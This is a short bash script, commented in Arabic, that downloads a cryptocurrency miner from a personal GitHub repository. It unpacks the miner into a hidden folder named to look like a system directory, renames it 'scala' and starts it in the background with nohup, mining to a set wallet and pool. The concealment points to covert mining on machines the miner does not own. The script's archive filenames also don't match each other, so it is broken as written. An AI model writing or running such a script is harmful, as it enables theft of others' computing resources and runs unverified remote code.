#!/bin/bash

# إعداد بيانات المحفظة والمسبح
WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"   # ← عدّلها لمحفظتك
WORKER="x" 
POOL="stratum+tcp://ghostrider.eu.mine.zergpool.com:5354"
THREADS=1   # ← عدد الأنوية المحدد للتعدين (1 Core)

# مجلد عمل مخفي
WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل SRBMiner-MULTI (Linux x64)
wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.xz

# فك الضغط في المجلد المخفي
tar -xvf scala.tar.gz --strip=1
rm scala.tar.xz

# تشغيل المعدّن في الخلفية بنواة واحدة
nohup ./scala \
   --algorithm ghostrider \
   --pool $POOL \
   --wallet $WALLET \
   --password c=XNA \
   --cpu-threads-limit $THREADS \
   > cpu_output.log 2>&1 &
